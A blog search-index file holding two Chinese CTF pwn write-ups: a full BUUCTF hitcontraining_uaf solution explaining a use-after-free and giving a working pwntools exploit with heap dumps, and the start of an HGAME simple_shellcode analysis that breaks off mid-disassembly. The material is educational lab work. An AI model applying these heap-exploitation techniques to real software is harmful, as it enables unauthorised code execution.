<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF-hitcontraining_uaf</title>
      <link href="/2025/11/08/BUUCTF-hitcontraining_uaf/"/>
      <url>/2025/11/08/BUUCTF-hitcontraining_uaf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、题目来源"><a href="#一、题目来源" class="headerlink" title="一、题目来源"></a>一、题目来源</h2><p>BUUCTF-Pwn-hitcontraining_uaf<br><img src = "/img/hitcontraining_uaf/image.png" style="zoom:30%"/></p><h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>通过 <code>file</code> 命令查看文件类型：</p><p><img src="/img/hitcontraining_uaf/image-20251108201238470.png" alt="image-20251108201238470"></p><p>通过 <code>checksec</code> 命令查看文件使用的保护机制：</p><p><img src="/img/hitcontraining_uaf/image-20251108201334593.png" alt="image-20251108201334593"></p><h2 id="三、反汇编文件开始分析"><a href="#三、反汇编文件开始分析" class="headerlink" title="三、反汇编文件开始分析"></a>三、反汇编文件开始分析</h2><p>将题目给的二进制文件丢入 IDA Pro 当中开始反汇编。</p><p>程序的主要功能菜单函数已经写的很清楚了：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1、add-note"><a href="#1、add-note" class="headerlink" title="1、add_note()"></a>1、add_note()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      **((_DWORD **)&amp;notelist + i) = print_note_content;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, *(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="number">4</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> ++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>笔记（note）的创建过程：</p><ul><li>最多只能创建 5 个笔记；</li><li>创建的笔记会通过一个名为“notelist”的“二维数组”来管理，其中：<ul><li><code>notelist[i][0]</code> 中存储的是函数 <code>print_note_content</code> 的地址，分配的 chunk 的大小为 8 字节；</li><li><code>notelist[i][1]</code> 中存储的笔记的内容的所在地址，分配的大小由用户自己指定（size）。</li></ul></li></ul><p>稍微解释一下为什么上面的二维数组被我打上了引号，从伪代码上看，将 notelist 理解成二维数组似乎并没有什么大的问题（根据原理数组 <code>a[n]</code> 的等价写法为 <code>*(a+n)</code>），但其实它更像是个结构体。因为，真正的二维数组 <code>a[R][C]</code> 要求的是整块 R×C 连续内存，但这明显不是（通过 malloc 动态分配的）。这个结构体可以表示成：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 32-bit 语义</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> (*print_note_content)();  <span class="comment">// notelist[i][0]</span></span><br><span class="line">    <span class="type">void</span> *content;          <span class="comment">// notelist[i][1]</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> *<span class="title">notelist</span>[5];</span></span><br></pre></td></tr></table></figure><p>顺带查看 <code>print_note_content</code> 函数的作用：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">print_note_content</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，其实这个函数是带参数的，IDA 并没帮我们显示出来，但是看里面的 <code>puts</code> 函数我们就应该知道，这传进来的就是本 note 的结构体的初始地址。因此，这个函数的作用就是打印 note 的内容。</p><h3 id="2、del-note"><a href="#2、del-note" class="headerlink" title="2、del_note()"></a>2、del_note()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + v2) + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notelist + v2));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难理解，输入 index 下标，通过 notelist 来查找对应的 note 然后进行 <code>free()</code> 操作。</p><p>但是，这里 <code>free()</code> 完成之后，并没有执行指针归“NULL”的操作，因此存在利用 UAF 的可能。</p><h3 id="3、print-note"><a href="#3、print-note" class="headerlink" title="3、print_note()"></a>3、print_note()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (**((<span class="type">int</span> (__cdecl ***)(_DWORD))&amp;notelist + v2))(*((_DWORD *)&amp;notelist + v2));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，输入 index 下标，通过 notelist 定位指定 note，然后调用 <code>print_note_content</code> 函数</p><h2 id="四、思路"><a href="#四、思路" class="headerlink" title="四、思路"></a>四、思路</h2><p>在程序的 .text 段，我们能找到一个叫做 magic 的函数，其代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们如果能通过一些手段，来执行这个函数的话，那么就能 getshell 了。</p><p>目前，分析出来的仅有的手段就是 UAF，而且存在函数调用的部分都是和 <code>print_note_content</code> 有关的。</p><p>如果我们能将 <code>print_note_content</code> 函数替换成 <code>magic</code> 函数，那么事情就成了。</p><p>要想实现替换，就得想办法在那个存放函数地址的、8 字节大小的 chunk 中写入数据。直接通过 <code>add_note()</code> 写是不行的，因为只能写到 content 中。因此，想到先 free 再 malloc 的操作，因为存放函数地址的地方本质上也是一个 chunk，既然是个 chunk，我们就可以先 free 掉，再 malloc 回来，将其作为 content 部分。</p><p>替换完成之后，我们只需要再次调用 <code>print_note</code> 即可实现 <code>magic</code> 函数的执行。</p><h2 id="五、Poc-构造"><a href="#五、Poc-构造" class="headerlink" title="五、Poc 构造"></a>五、Poc 构造</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27273)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size = <span class="string">b&#x27;16&#x27;</span>,content = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span></span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Note size :&#x27;</span>,size)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_exit</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addnote()</span><br><span class="line">addnote()</span><br><span class="line"></span><br><span class="line">delnote(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delnote(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048945</span></span><br><span class="line"></span><br><span class="line">addnote(size=<span class="string">b&#x27;8&#x27;</span>,content=p32(magic))</span><br><span class="line"></span><br><span class="line">printnote(index=<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>前面一些定义的函数是为了实现程序中对应的功能。</p><p>首先，我们申请了两个 note：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addnote()</span><br><span class="line">addnote()</span><br></pre></td></tr></table></figure><p>此时可以动态调试看看：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x9634008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x9634198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x96341a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x96341c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x96341d8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x96341f8</span><br><span class="line">Size: 0x21e08 (with flag bits: 0x21e09)</span><br></pre></td></tr></table></figure><p>可以看到，四个 chunk 已经申请完毕了，其中两个是存放函数地址的，两个是存放 content 的（我设置的 size 大小为 16，这是为了避免和 size 大小为8 的、存放函数的那个 chunk 在 free 之后放入同一个 bin 中）。</p><p>我们也可以稍微验证一下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x9634198</span><br><span class="line">00:0000│     0x9634198 ◂— 0</span><br><span class="line">01:0004│     0x963419c ◂— 0x11</span><br><span class="line">02:0008│     0x96341a0 —▸ 0x80485fb (print_note_content) ◂— push ebp</span><br></pre></td></tr></table></figure><blockquote><p>存放的地址往后移了 8 字节是因为 chunk 的数据结构，在 user data 前面还有pre_size（0） 和 size（0x11） 两个成员变量。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x96341a8</span><br><span class="line">00:0000│     0x96341a8 ◂— 0</span><br><span class="line">01:0004│     0x96341ac ◂— 0x21 /* <span class="string">&#x27;!&#x27;</span> */</span><br><span class="line">02:0008│     0x96341b0 ◂— <span class="string">&#x27;AAAAAAAAAAAAAAAA&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>我默认的写入内容就是 16 字节的 A。</p></blockquote><p>接下来，我们将这两篇 note 进行 delete 操作，即执行 del_note：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delnote(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delnote(<span class="string">b&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么，这四个 chunk 都会被放入 tcache bins 中：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x8a1b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x8a1b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x8a1b</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x8a1b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x8a1b</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x8a1b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x8a13bbb</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x8a1b1d8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x8a13bab</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x8a1b1f8</span><br><span class="line">Size: 0x21e08 (with flag bits: 0x21e09)</span><br></pre></td></tr></table></figure><p>但是，此时的 listnote 中的指针并没有被置为 NULL。</p><p>此时，我们再次创建 note，这次将大小精确设置为 8 字节：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x08048945</span></span><br><span class="line"></span><br><span class="line">addnote(size=<span class="string">b&#x27;8&#x27;</span>,content=p32(magic))</span><br></pre></td></tr></table></figure><p>且内容写的是 magic 函数的地址。</p><p>现在发生的事情就是：因为没有指针置 NULL，因此有两个指针指向这个 8 字节大小的 chunk，其中一个能把这当成 note 的 content 部分，从而写入信息；而另一个能把这部分当成函数来调用。</p><p>由此，我们接下来只需要调用 print_note 功能，即可实现 magic 函数的调用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">printnote(index=<span class="string">b&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>需要注意的是，index 应该指定为 0，因为 tcanche bin 是一个后进先出的单项链表，而我们使用 add_note 这个函数的时候，实质上会申请两个 chunk 即在 tcache bin 中的两个 8 字节大小的 chunk 都被我们申请出来了。其中，第一个 chunk 用于存放函数地址，后一个 chunk 用来存放 content，根据我们的分析，我们要利用的是后一个 chunk（这个 chunk 对应的就是当时 del_note 删除的第二个 note 的、用于存放函数地址的那个 chunk。）。</p></blockquote><p>若对 index 的选择有疑问的，可以动态调试看看：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x9ccb008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x9ccb198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x9ccb1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x9ccb</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x9ccb1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x9ccb1d8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x9cc2d7b</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x9ccb1f8</span><br><span class="line">Size: 0x21e08 (with flag bits: 0x21e09)</span><br></pre></td></tr></table></figure><p>（pwndbg 插件默认帮我们取消了 ASLR 来方便我们调试分析）不难发现，两个 8 字节大小的 chunk 都被 malloc 了出来，根据我们的分析，存放函数地址的是 0x9ccb1d0（0x9ccb1c8 + 0x8，别忘了 chunk 的数据结构） ，验证：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x9ccb1c8</span><br><span class="line">00:0000│     0x9ccb1c8 ◂— 0</span><br><span class="line">01:0004│     0x9ccb1cc ◂— 0x11</span><br><span class="line">02:0008│     0x9ccb1d0 —▸ 0x80485fb (print_note_content) ◂— push ebp</span><br></pre></td></tr></table></figure><p>存放内容的地方是 0x0x9ccb1a0（0x9ccb198 + 0x8），验证：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x9ccb198</span><br><span class="line">00:0000│     0x9ccb198 ◂— 0</span><br><span class="line">01:0004│     0x9ccb19c ◂— 0x11</span><br><span class="line">02:0008│     0x9ccb1a0 —▸ 0x8048945 (magic) ◂— push ebp</span><br></pre></td></tr></table></figure><p>和我们分析的一致，因此 index 选择的应该是 0 而不是 1。</p><p>本地 Poc 运行：</p><img src="/img/hitcontraining_uaf/image-20251109082803595.png" alt="image-20251109082803595" style="zoom:33%;" /><p>成功拿下本地 shell。</p><p>远程 Poc 执行：</p><img src="img/hitcontraining_uaf/image-20251109083002054.png" alt="image-20251109083002054" style="zoom:33%;" /><p>成功拿下 flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Pwn </category>
          
          <category> Heap_Exploitation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-[HGAME 2023 week1]simple_shellcode</title>
      <link href="/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/"/>
      <url>/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="NSSCTF-HGAME-2023-week1-simple-shellcode"><a href="#NSSCTF-HGAME-2023-week1-simple-shellcode" class="headerlink" title="NSSCTF-[HGAME 2023 week1]simple_shellcode"></a>NSSCTF-[HGAME 2023 week1]simple_shellcode</h1><h2 id="一、题目来源"><a href="#一、题目来源" class="headerlink" title="一、题目来源"></a>一、题目来源</h2><p>NSSCTF-Pwn-[HGAME 2023 week1]simple_shellcode</p><p><img src="/img/simple_shellcode/image.png" alt="img"></p><h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p><img src="/img/simple_shellcode/image-1.png" alt="img"></p><p>发现是一个 64 位的 ELF 文件，并且保护措施基本上开全了。</p><h2 id="三、反汇编文件开始分析"><a href="#三、反汇编文件开始分析" class="headerlink" title="三、反汇编文件开始分析"></a>三、反汇编文件开始分析</h2><p>程序首先用 mmap 在虚拟内存上开辟了一片空间，该空间的访问控制权限为“可读-可写-可执行”（因为 prot 参数的值为 7）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001336                                   buf= qword ptr -8</span><br><span class="line">…………</span><br><span class="line">.text:0000000000001355 018 41 B9 00 00 00 00             mov     r9d, 0                          ; offset</span><br><span class="line">.text:000000000000135B 018 41 B8 FF FF FF FF             mov     r8d, 0FFFFFFFFh                 ; fd</span><br><span class="line">.text:0000000000001361 018 B9 21 00 00 00                mov     ecx, 21h ; &#x27;!&#x27;                  ; flags</span><br><span class="line">.text:0000000000001366 018 BA 07 00 00 00                mov     edx, 7                          ; prot</span><br><span class="line">.text:000000000000136B 018 BE 00 10 00 00                mov     esi, 1000h                      ; len</span><br><span class="line">.text:0000000000001370 018 BF 00 00 FE CA                mov     edi, 0CAFE0000h                 ; addr</span><br><span class="line">.text:0000000000001375 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000137A 018 E8 41 FD FF FF                call    _mmap</span><br></pre></td></tr></table></figure><p>接着，程序调用 read 函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000138B 018 48 8B 45 F8                   mov     rax, [rbp+buf]</span><br><span class="line">.text:000000000000138F 018 BA 10 00 00 00                mov     edx, 10h                        ; nbytes</span><br><span class="line">.text:0000000000001394 018 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:0000000000001397 018 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class="line">.text:000000000000139C 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000013A1 018 E8 2A FD FF FF                call    _read</span><br></pre></td></tr></table></figure><p><strong>需要注意的是</strong>：这里的 read 的第二个参数和以往我们看到的不太一样，这里使用的是 mov 指令而不是 lea指令。</p><p>这也就意味着，我们真正写入 rsi 的是地址 <code>0xcafe00000</code> 也就是我们之前开辟的那片虚拟内存的首址。</p><p>因此，这个和栈溢出可以说的八竿子打不着了，我们接着分析。</p><p>然后，我们就可以看到本程序所使用的沙箱：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013A6 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000013AB 018 E8 9E FE FF FF                call    sandbox</span><br><span class="line"></span><br><span class="line">.text:000000000000124E                                   public sandbox</span><br><span class="line">.text:000000000000124E                                   sandbox proc near                       ; CODE XREF: main+75↓p</span><br><span class="line">.text:000000000000124E</span><br><span class="line">.text:000000000000124E                                   var_40= qword ptr -40h</span><br><span class="line">.text:000000000000124E                                   var_38= qword ptr -38h</span><br><span class="line">.text:000000000000124E                                   var_30= word ptr -30h</span><br><span class="line">.text:000000000000124E                                   var_2E= byte ptr -2Eh</span><br><span class="line">.text:000000000000124E                                   var_2D= byte ptr -2Dh</span><br><span class="line">.text:000000000000124E                                   var_2C= dword ptr -2Ch</span><br><span class="line">.text:000000000000124E                                   var_28= word ptr -28h</span><br><span class="line">.text:000000000000124E                                   var_26= byte ptr -26h</span><br><span class="line">.text:000000000000124E                                   var_25= byte ptr -25h</span><br><span class="line">.text:000000000000124E                                   var_24= dword ptr -24h</span><br><span class="line">.text:000000000000124E                                   var_20= word ptr -20h</span><br><span class="line">.text:000000000000124E                                   var_1E= byte ptr -1Eh</span><br><span class="line">.text:000000000000124E                                   var_1D= byte ptr -1Dh</span><br><span class="line">.text:000000000000124E                                   var_1C= dword ptr -1Ch</span><br><span class="line">.text:000000000000124E                                   var_18= word ptr -18h</span><br><span class="line">.text:000000000000124E                                   var_16= byte ptr -16h</span><br><span class="line">.text:000000000000124E                                   var_15= byte ptr -15h</span><br><span class="line">.text:000000000000124E                                   var_14= dword ptr -14h</span><br><span class="line">.text:000000000000124E                                   var_10= word ptr -10h</span><br><span class="line">.text:000000000000124E                                   var_E= byte ptr -0Eh</span><br><span class="line">.text:000000000000124E                                   var_D= byte ptr -0Dh</span><br><span class="line">.text:000000000000124E                                   var_C= dword ptr -0Ch</span><br><span class="line">.text:000000000000124E                                   var_8= qword ptr -8</span><br><span class="line">.text:000000000000124E</span><br><span class="line">.text:000000000000124E                                   ; __unwind &#123;</span><br><span class="line">.text:000000000000124E 000 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000001252 000 55                            push    rbp</span><br><span class="line">.text:0000000000001253 008 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000001256 008 48 83 EC 40                   sub     rsp, 40h</span><br><span class="line">.text:000000000000125A 048 64 48 8B 04 25 28 00 00 00    mov     rax, fs:28h</span><br><span class="line">.text:0000000000001263 048 48 89 45 F8           